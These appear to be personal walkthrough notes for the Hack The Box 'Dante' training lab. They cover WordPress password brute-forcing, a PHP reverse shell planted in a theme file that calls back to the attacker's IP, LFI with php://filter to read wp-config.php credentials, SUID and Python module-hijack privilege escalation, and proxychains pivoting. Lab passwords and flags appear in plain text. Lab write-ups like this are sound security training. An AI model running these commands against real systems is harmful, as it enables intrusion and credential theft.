# 📦 HTB | dante

Tags: #📦
Related to: [[gobuster]], [[file]], [[FTP]], [[Immunity Debugger]], [[PHP]], [[SQL]], [[base64]], [[bash]], [[cewl]], [[chisel]], [[curl]], [[du]], [[find]], [[firefox]], [[ghidra]], [[gtfobins lolbas]], [[gunzip]], [[id]], [[ifconfig]], [[john]], [[msfvenom]], [[nc]], [[nmap]], [[peass]], [[powershell]], [[proxychains4]], [[pspy]], [[pwntools]], [[python]], [[searchsploit]], [[smbclient]], [[sqlmap]], [[ssh]], [[strings]], [[stty]], [[su]], [[sum]], [[upx]], [[w_findstr]], [[w_hostname]], [[w_net]], [[w_netsh]], [[w_netstat]], [[w_tasklist]], [[w_type]], [[wget]], [[wget]], [[whoami]], [[wireshark]], [[wpscan]]
See also: 
Previous: [[01 HTB/HTB]]

# Description

Dante is a modern, yet beginner-friendly pro lab that provides the opportunity to learn common penetration testing methodologies, and gain familiarity with tools included in the Parrot OS Linux distribution. Dante LLC have enlisted your services to audit their network. The company has not undergone a comprehensive penetration test in the past, and want to reduce their technical debt. They are concerned that any actual breach could lead to a loss of earnings and reputation damage.

Upon breaching the perimeter, you are required to explore the network, moving laterally and vertically, until you gain administrative control over all hosts and reach domain admin. You will level up your skills in information gathering and situational awareness, be able to exploit Windows and Linux buffer overflows, gain familiarity with the Metasploit Framework, and much else!

There are many flags to be captured along the way, some on the main attack path and others in side-quests that you must go looking for. Submitting flags will propel you through the Hall of Fame, rewarding you with badges in the process.

This **Penetration Tester Level I** lab will expose players to:

-   Enumeration
-   Exploit Development
-   Lateral Movement
-   Privilege Escalation
-   Web Application Attacks

Your entry point is in **10.10.110.0/24**. The firewall at **10.10.110.2** is out of scope

# I'm nuts and bolts about you

Ping scan:

	nmap -sn -T4 10.10.110.0/24 -oN active-hosts		// returned no results
	
Known active system:

	nmap -A -sC -p0- --min-rate=1000 -Pn 10.10.110.100	// DANTE{Y0u_Cant_G3t_at_m3_br0!}

```text
Nmap scan report for 10.10.110.100
Host is up (0.043s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.173
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8f:a2:ff:cf:4e:3e:aa:2b:c2:6f:f4:5a:2a:d9:e9:da (RSA)
|   256 07:83:8e:b6:f7:e6:72:e9:65:db:42:fd:ed:d6:93:ee (ECDSA)
|_  256 13:45:c5:ca:db:a6:b4:ae:9c:09:7d:21:cd:9d:74:f4 (ED25519)
65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Anonymous FTP login:

	ftp 10.10.110.100	// anonymous:anonymous
	ls
	cd Transfer
	cd Incoming
	get todo.txt

	cat todo.txt
	
```text
- Finalize Wordpress permission changes - PENDING
- Update links to to utilize DNS Name prior to changing to port 80 - PENDING
- Remove LFI vuln from the other site - PENDING
- Reset James' password to something more secure - PENDING
- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS
```

robots.txt:

	wget http://10.10.110.100:65000/robots.txt

```text
User-agent: Googlebot
User-agent: AdsBot-Google
Disallow: /wordpress
Disallow: DANTE{Y0u_Cant_G3t_at_m3_br0!}
```

	firefox http://10.10.110.100:65000/wordpress/

Enumerate vulnerable plugins:

	wpscan --url http://10.10.110.100:65000/wordpress --enumerate vp -o wpscan.txt

Interesting Finding(s):

```text
[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: https://codex.wordpress.org/Debugging_in_WordPress

[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.110.100:65000/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
 |  - http://10.10.110.100:65000/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.8
 | Style URL: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'


[i] No plugins Found.
```

Check WordPress Vulnerability Database. [^1]

Enumerate users:

	wpscan --url http://10.10.110.100:65000/wordpress --enumerate u

```text
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.110.100:65000/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] james
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
 ```

Create potential user list:

	vi names.txt

```text
admin
james
kevin
balthazar
bally
aj
nathan
```

Create wordlist:

	cewl -w cewl.txt http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks

Bruteforce WordPress login:

	wpscan --url http://10.10.110.100:65000/wordpress --usernames names.txt --passwords cewl.out

Found:

	james:Toyota

Attempting SSH login with james:Toyota fails.

Navigate to WordPress => Users:

	http://10.10.110.100:65000/wordpress/wp-admin/users.php	// james has admin privileges

Navigate to Appearance => Theme Editor:

	http://10.10.110.100:65000/wordpress/wp-admin/theme-editor.php	// select theme Twenty Nineteen
	
Insert PHP code into 404.php:
	
	<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.173/9001 0>&1'"); ?>

Execute PHP code:

	firefox http://10.10.110.100:65000/wordpress/wp-content/themes/twentynineteen/404.php

Got shell on www-data@DANTE-WEB-NIX01:

	id	// uid=33(www-data) gid=33(www-data) groups=33(www-data)

Upgrade tty:

	which python3									// python3 installed?
	python3 -c 'import pty;pty.spawn("/bin/bash")'	// spawn a bash terminal
	<Ctrl+Z>										// background it
	stty raw -echo;fg								// change terminal line settings
	export TERM=xterm								// enable clear screen functionality
	stty -a											// get rows/cols from main terminal
	stty rows 65 cols 117							// set for upgraded terminal

Explore:

	cd /home
	ls -la	// james; balthazar

Login as james:

	su - james	// Toyota
	cat flag.txt			// DANTE{j4m3s_NEEd5_a_p455w0rd_M4n4ger!}
	cat .bash_history		// reveals mysql credentials
	
```bash
cd /home/balthazar
rm .mysql_history
mysql -u balthazar -p TheJoker12345!
```

Find SUID files:

	find / -perm -4000 -ls 2>/dev/null

```text
/usr/bin/vmware-user-suid-wrapper
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/find
```

Exploit find SUID misconfiguration: [^2]

	find . -exec /bin/bash -p \; -quit	// bash-5.0#
	id									// uid=1001(james) gid=1001(james) euid=0(root) groups=1001(james)

# Seclusion is an illusion

	ifconfig

```text
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.1.100  netmask 255.255.255.0  broadcast 172.16.1.255
        inet6 fe80::250:56ff:feb9:bcff  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:bc:ff  txqueuelen 1000  (Ethernet)
        RX packets 1312723  bytes 282279120 (282.2 MB)
        RX errors 0  dropped 29  overruns 0  frame 0
        TX packets 2192918  bytes 664647759 (664.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Identify live hosts on subnet:

	for i in {1..255} ; do (ping -c 1 172.16.1.$i | grep "bytes from" | cut -d ' ' -f4 | tr -d ':' &); done

```text
172.16.1.5
172.16.1.10
172.16.1.12
172.16.1.13
172.16.1.17
172.16.1.19
172.16.1.20
172.16.1.100
172.16.1.101
172.16.1.102
```

Upgrade to SSH shell and tunnel. Edit /etc/proxychains4.conf file to proxy requests through SOCKS port 1080:

	socks5 127.0.0.1 1080

Add your public key to the target and upgrade to SSH shell:

	ssh-keygen -b 4096								// create key in ~/.ssh/
	cat ~/.ssh/id_rsa.pub							// add this to target /root/.ssh/authorized_keys
																								// and if you created authorized_keys, ensure that the
																								// permissions are root:root and chmod 700.
	ssh -i ~/.ssh/id_rsa -D 1080 root@10.10.110.100	// root@DANTE-WEB-NIX01

nmap through proxychains4:

```text
Note: nmap SYN scan is not proxy aware and there is limited support for the Nmap --proxies option. Instead, we can use a TCP Connect Scan (-sT), which uses the OS to issue a higher-level connect system call that routes the traffic through the proxy.
```

	proxychains nmap 172.16.1.10 -sT -sV -Pn -T5

```text
Nmap scan report for 172.16.1.10
Host is up, received user-set (0.11s latency).
Scanned at 2021-12-25 16:43:34 EST for 115s
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

	proxychains firefox http://172.16.1.10

Looking at the URL, we can see that the application includes different pages using a page
parameter. This is a good sign for a potential local file inclusion (LFI) vulnerability. Let's test this by
attempting to access /etc/passwd

	view-source:http://172.16.1.10/nav.php?page=../../../../etc/passwd
	
```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
frank:x:1000:1000:frank,,,:/home/frank:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
margaret:x:1001:1001::/home/margaret:/bin/lshell
mysql:x:126:133:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:127:65534::/run/sshd:/usr/sbin/nologin
```

```text
frank
margaret
```

Get Margaret's flag:

	view-source:http://172.16.1.10/nav.php?page=../../../../home/margaret/flag.txt

Connect to Samba service:

	proxychains smbclient -L \\172.16.1.10	// list services; root:<blankpassword>

```text
Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        SlackMigration  Disk      
        IPC$            IPC       IPC Service (DANTE-NIX02 server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

The login with root username and empty password is successful, which means that SMB NULL
sessions are permitted.

Connect to share:

	proxychains smbclient \\\\172.16.1.10\\SlackMigration	// root:<blankpassword>

```text
smb: \> ls
  .                                   D        0  Mon Apr 12 10:39:41 2021
  ..                                  D        0  Mon Apr 12 10:39:41 2021
  admintasks.txt                      N      279  Mon May 18 11:24:22 2020

smb: \> get admintasks.txt
```

	cat admintasks.txt

```text
-Remove wordpress install from web root - PENDING
-Reinstate Slack integration on Ubuntu machine - PENDING
-Remove old employee accounts - COMPLETE
-Inform Margaret of the new changes - COMPLETE
-Remove account restrictions on Margarets account post-promotion to admin - PENDING
```

This states that the WordPress CMS is installed on the web root.

	proxychains firefox http://172.16.1.10/wordpress	// not directly accessible
	proxychains firefox http://172.16.1.10/nav.php?page=/var/www/html/index.html			// It works
	proxychains firefox http://172.16.1.10/nav.php?page=/var/www/html/wordpress/index.php	// 500 error

The error message confirms that the WordPress is installed in the web root. In general, WordPress stores the database configuration in the file wp-config.php.

PHP provides various wrappers [^3], which can be used for easier access of files, protocols or streams. A complete list of wrappers can be found here. The php:// wrapper is enabled by default and is used to interact with IO streams. For example: php://stdin and php://stdout can be used to access input and output streams for the process, while php://input and php://output are used to access request data. A useful wrapper is php://filter , which can be chained with multiple filters to achieve the desired output.

For example, the filter php://filter/read=/resource=/etc/passwd reads the resource /etc/passwd and outputs the contents. The read filter can be used to process the input with various string operations, such as base64 encoding, ROT13 encoding etc.

The following filters will convert the contents of /etc/passwd to base64 and ROT13 respectively.

	php://filter/read=convert.base64-encode/resource=/etc/passwd
	php://filter/read=string.rot13/resource=/etc/passwd

Let's try base64 encoding and including wp-config.php using the filter.

	proxychains firefox http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php

```text
PD9waHANCi8qKg0KICogVGhlIGJhc2UgY29uZmlndXJhdGlvbiBmb3IgV29yZFByZXNzDQogKg0KICogVGhlIHdwLWNvbmZpZy5waHAgY3JlYXRpb24gc2NyaXB0IHVzZXMgdGhpcyBmaWxlIGR1cmluZyB0aGUNCiAqIGluc3RhbGxhdGlvbi4gWW91IGRvbid0IGhhdmUgdG8gdXNlIHRoZSB3ZWIgc2l0ZSwgeW91IGNhbg0KICogY29weSB0aGlzIGZpbGUgdG8gIndwLWNvbmZpZy5waHAiIGFuZCBmaWxsIGluIHRoZSB2YWx1ZXMuDQogKg0KICogVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBmb2xsb3dpbmcgY29uZmlndXJhdGlvbnM6DQogKg0KICogKiBNeVNRTCBzZXR0aW5ncw0KICogKiBTZWNyZXQga2V5cw0KICogKiBEYXRhYmFzZSB0YWJsZSBwcmVmaXgNCiAqICogQUJTUEFUSA0KICoNCiAqIEBsaW5rIGh0dHBzOi8vd29yZHByZXNzLm9yZy9zdXBwb3J0L2FydGljbGUvZWRpdGluZy13cC1jb25maWctcGhwLw0KICoNCiAqIEBwYWNrYWdlIFdvcmRQcmVzcw0KICovDQoNCi8vICoqIE15U1FMIHNldHRpbmdzIC0gWW91IGNhbiBnZXQgdGhpcyBpbmZvIGZyb20geW91ciB3ZWIgaG9zdCAqKiAvLw0KLyoqIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZSBmb3IgV29yZFByZXNzICovDQpkZWZpbmUoICdEQl9OQU1FJyAnd29yZHByZXNzJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnbWFyZ2FyZXQnICk7DQoNCi8qKiBNeVNRTCBkYXRhYmFzZSBwYXNzd29yZCAqLw0KZGVmaW5lKCAnREJfUEFTU1dPUkQnLCAnV2VsY29tZTEhMkAzIycgKTsNCg0KLyoqIE15U1FMIGhvc3RuYW1lICovDQpkZWZpbmUoICdEQl9IT1NUJywgJ2xvY2FsaG9zdCcgKTsNCg0KLyoqIERhdGFiYXNlIENoYXJzZXQgdG8gdXNlIGluIGNyZWF0aW5nIGRhdGFiYXNlIHRhYmxlcy4gKi8NCmRlZmluZSggJ0RCX0NIQVJTRVQnLCAndXRmOCcgKTsNCg0KLyoqIFRoZSBEYXRhYmFzZSBDb2xsYXRlIHR5cGUuIERvbid0IGNoYW5nZSB0aGlzIGlmIGluIGRvdWJ0LiAqLw0KZGVmaW5lKCAnREJfQ09MTEFURScsICcnICk7DQoNCi8qKiNAKw0KICogQXV0aGVudGljYXRpb24gVW5pcXVlIEtleXMgYW5kIFNhbHRzLg0KICoNCiAqIENoYW5nZSB0aGVzZSB0byBkaWZmZXJlbnQgdW5pcXVlIHBocmFzZXMhDQogKiBZb3UgY2FuIGdlbmVyYXRlIHRoZXNlIHVzaW5nIHRoZSB7QGxpbmsgaHR0cHM6Ly9hcGkud29yZHByZXNzLm9yZy9zZWNyZXQta2V5LzEuMS9zYWx0LyBXb3JkUHJlc3Mub3JnIHNlY3JldC1rZXkgc2VydmljZX0NCiAqIFlvdSBjYW4gY2hhbmdlIHRoZXNlIGF0IGFueSBwb2ludCBpbiB0aW1lIHRvIGludmFsaWRhdGUgYWxsIGV4aXN0aW5nIGNvb2tpZXMuIFRoaXMgd2lsbCBmb3JjZSBhbGwgdXNlcnMgdG8gaGF2ZSB0byBsb2cgaW4gYWdhaW4uDQogKg0KICogQHNpbmNlIDIuNi4wDQogKi8NCmRlZmluZSggJ0FVVEhfS0VZJywgICAgICAgICAncHV0IHlvdXIgdW5pcXVlIHBocmFzZSBoZXJlJyApOw0KZGVmaW5lKCAnU0VDVVJFX0FVVEhfS0VZJywgICdwdXQgeW91ciB1bmlxdWUgcGhyYXNlIGhlcmUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ3B1dCB5b3VyIHVuaXF1ZSBwaHJhc2UgaGVyZScgKTsNCmRlZmluZSggJ05PTkNFX0tFWScsICAgICAgICAncHV0IHlvdXIgdW5pcXVlIHBocmFzZSBoZXJlJyApOw0KZGVmaW5lKCAnQVVUSF9TQUxUJywgICAgICAgICdwdXQgeW91ciB1bmlxdWUgcGhyYXNlIGhlcmUnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJ3B1dCB5b3VyIHVuaXF1ZSBwaHJhc2UgaGVyZScgKTsNCmRlZmluZSggJ0xPR0dFRF9JTl9TQUxUJywgICAncHV0IHlvdXIgdW5pcXVlIHBocmFzZSBoZXJlJyApOw0KZGVmaW5lKCAnTk9OQ0VfU0FMVCcsICAgICAgICdwdXQgeW91ciB1bmlxdWUgcGhyYXNlIGhlcmUnICk7DQoNCi8qKiNALSovDQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqDQogKiBZb3UgY2FuIGhhdmUgbXVsdGlwbGUgaW5zdGFsbGF0aW9ucyBpbiBvbmUgZGF0YWJhc2UgaWYgeW91IGdpdmUgZWFjaA0KICogYSB1bmlxdWUgcHJlZml4LiBPbmx5IG51bWJlcnMsIGxldHRlcnMsIGFuZCB1bmRlcnNjb3JlcyBwbGVhc2UhDQogKi8NCiR0YWJsZV9wcmVmaXggPSAnd3BfJzsNCg0KLyoqDQogKiBGb3IgZGV2ZWxvcGVyczogV29yZFByZXNzIGRlYnVnZ2luZyBtb2RlLg0KICoNCiAqIENoYW5nZSB0aGlzIHRvIHRydWUgdG8gZW5hYmxlIHRoZSBkaXNwbGF5IG9mIG5vdGljZXMgZHVyaW5nIGRldmVsb3BtZW50Lg0KICogSXQgaXMgc3Ryb25nbHkgcmVjb21tZW5kZWQgdGhhdCBwbHVnaW4gYW5kIHRoZW1lIGRldmVsb3BlcnMgdXNlIFdQX0RFQlVHDQogKiBpbiB0aGVpciBkZXZlbG9wbWVudCBlbnZpcm9ubWVudHMuDQogKg0KICogRm9yIGluZm9ybWF0aW9uIG9uIG90aGVyIGNvbnN0YW50cyB0aGF0IGNhbiBiZSB1c2VkIGZvciBkZWJ1Z2dpbmcsDQogKiB2aXNpdCB0aGUgZG9jdW1lbnRhdGlvbi4NCiAqDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyogVGhhdCdzIGFsbCwgc3RvcCBlZGl0aW5nISBIYXBweSBwdWJsaXNoaW5nLiAqLw0KDQovKiogQWJzb2x1dGUgcGF0aCB0byB0aGUgV29yZFByZXNzIGRpcmVjdG9yeS4gKi8NCmlmICggISBkZWZpbmVkKCAnQUJTUEFUSCcgKSApIHsNCglkZWZpbmUoICdBQlNQQVRIJywgX19ESVJfXyAuICcvJyApOw0KfQ0KDQovKiogU2V0cyB1cCBXb3JkUHJlc3MgdmFycyBhbmQgaW5jbHVkZWQgZmlsZXMuICovDQpyZXF1aXJlX29uY2UgQUJTUEFUSCAuICd3cC1zZXR0aW5ncy5waHAnOw0K
```

Let's decode the contents to a file:

	proxychains curl "172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php" | base64 -d > wp-config.php

```sql
/ ** MySQL settings - You can get this info from your web host ** //
/ ** The name of the database for WordPress */
define( 'DB_NAME' 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'margaret' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Welcome1!2@3#' );
```

	proxychains ssh margaret@172.16.1.10	// Welcome1!2@3#

Break out of restricted shell:

```bash
vim
:set shell=/bin/sh
:shell
```

	cat flag.txt	// DANTE{LF1_M@K3s_u5_lol}

# Snake it 'til you make it

```
Previous enumeration mentioned that the Slack integration task was pending. In general, Slack stores files for each user in the hidden /home/<user>/.config/Slack directory. When a Slack admin exports their workspace data, it stores most of this in JSON format.
```

	ls -la .config/Slack/exported_data

```bash
drwxr-xr-x  6 margaret margaret 4096 Apr 12  2021 .
drwxrwxr-x 11 margaret margaret 4096 Apr 12  2021 ..
-rw-r--r--  1 margaret margaret 2105 May 19  2020 channels.json
-rw-r--r--  1 margaret margaret    4 May 19  2020 integration_logs.json
drwx------  2 margaret margaret 4096 Apr 12  2021 project
drwx------  2 margaret margaret 4096 Apr 12  2021 secure
drwx------  2 margaret margaret 4096 Apr 12  2021 team
-rw-r--r--  1 margaret margaret 4442 May 19  2020 users.json
drwx------  2 margaret margaret 4096 Apr 12  2021 welcome
```

	cat /home/margaret/.config/Slack/exported_data/secure/2020-05-18.json	// conversation between frank and margaret

```
text: "I also set you a new password on the Ubuntu box - TractorHeadtorchDeskmat, same username"
```

	su frank	// TractorHeadtorchDeskmat
	id			// uid=1000(frank) gid=1000(frank) groups=1000(frank)
	ls -la		// -r--r--r--  1 root  root   198 May 19  2020 apache_restart.py
	cat apache_restart.py

```python
import call
import urllib
url = urllib.urlopen(localhost)
page= url.getcode()
if page ==200:
        print ("We're all good!")
else:
        print("We're failing!")
        call(["systemctl start apache2"], shell=True)
```

The script checks the apache2 server service status by sending a GET request to localhost. If the response code is not equal to 200 then it restarts the service. It's worth noting that there is no while loop in the script to repeat the check at regular intervals, which hints that a cronjob may have been configured. We can confirm this by downloading and running pspy.

Download statically compiled binary locally:

	wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s

Check that the file is an executable:

	file pspy64s

Start Simple HTTP Server:

	python -m SimpleHTTPServer 80		// Python
	python3	-m http.server 80			// Python 3

Download to target system:

	curl 10.10.17.201/pspy64s -o pspy64s

Spy on processes:

```bash
./pspy64s -fc	// -f 	print file system events
				// -c	color
```

```bash
/usr/sbin/cron -f
python3 /home/frank/apache_restart.py

/bin/sh -c python3 /home/frank/apache_restart.py; sleep 1; rm /home/frank/call.py; sleep 1; rm /home/frank/urllib.py

sleep 1
```

pspy output reveals that root is running the script every minute. The script is not writable by frank, although it imports the call and urllib modules. Python has a list of search paths for its libraries. This can be viewed by running the following commands:

	python3

```python
import sys
sys.path
```

```
['', '/usr/lib/python38.zip', '/usr/lib/python3.8', '/usr/lib/python3.8/lib-dynload', '/usr/local/lib/python3.8/dist-packages', '/usr/lib/python3/dist-packages']
```

Python first checks for modules in the current working directory, before looking in the other paths. We can attempt to hijack loading of the legitimate call or urllib modules, so that our malicious module is loaded instead. Let's create a urllib.py file in the /home/frank folder with the contents below:

	vi urllib.py

```python
import os
os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")
```

Note: Bash preserves the effective user id (i.e. root) when -p option is supplied at invocation, which gives us root access.

	/tmp/sh -p			// #
	
Add public key and upgrade to SSH shell:

	touch /root/.ssh/authorized_keys
	chown root:root /root/.ssh/authorized_keys
	chmod 770 /root/.ssh/authorized_keys						// rwx for root user and group
	cat ~/.ssh/id_rsa.pub										// add this to target /root/.ssh/authorized_keys
	proxychains ssh -i ~/.ssh/id_rsa -D 1080 root@172.16.1.10	// root@DANTE-NIX02

# Feeling fintastic

	proxychains nmap 172.16.1.17 -sT -sV -Pn -T5

```text
Nmap scan report for 172.16.1.17
Host is up (0.092s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.41
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.900 (Webmin httpd)
Service Info: Host: 127.0.0.1
```

	proxychains firefox http://172.16.1.17/
